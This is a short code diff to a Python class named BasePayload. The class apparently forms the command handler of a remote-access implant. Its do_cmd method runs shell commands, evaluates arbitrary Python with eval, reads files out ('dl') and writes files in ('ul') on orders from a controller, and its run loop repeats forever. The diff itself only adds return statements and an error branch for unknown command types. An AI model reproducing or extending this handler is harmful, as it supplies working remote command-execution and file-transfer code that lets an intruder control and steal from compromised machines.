@@ -10,18 +10,21 @@ class BasePayload(object):
 	def do_cmd(self, cmd):
 		if cmd['type'] == 'sh':
 			cmd['res'] = utils.sh(cmd['cmd'])
+			return cmd
 		elif cmd['type'] == 'eval':
 			try:
 				r = eval(cmd['cmd'])
 			except Exception as e:
 				r = e
 			cmd['res'] = r
+			return cmd
 		elif cmd['type'] == 'dl':
 			try:
 				fd = open(cmd['fn'],'rb').read()
 			except Exception as e:
 				fd = e
-			cmd['res'] = fd 
+			cmd['res'] = fd
+			return cmd
 		elif cmd['type'] == 'ul':
 			try:
 				with open(cmd['fn'],'wb') as f:
@@ -30,10 +33,13 @@ class BasePayload(object):
 			except Exception as e:
 				r = e
 			cmd['res'] = r
+			return cmd
 		elif cmd['type'] == 'exit':
 			cmd['res'] = 'okay'
 			self.exit_trigger = True
-		return cmd
+			return cmd
+		else:
+			cmd['res'] = "invalid type: "+cmd['type']
 	def run(self):
 		while True:
 			try:
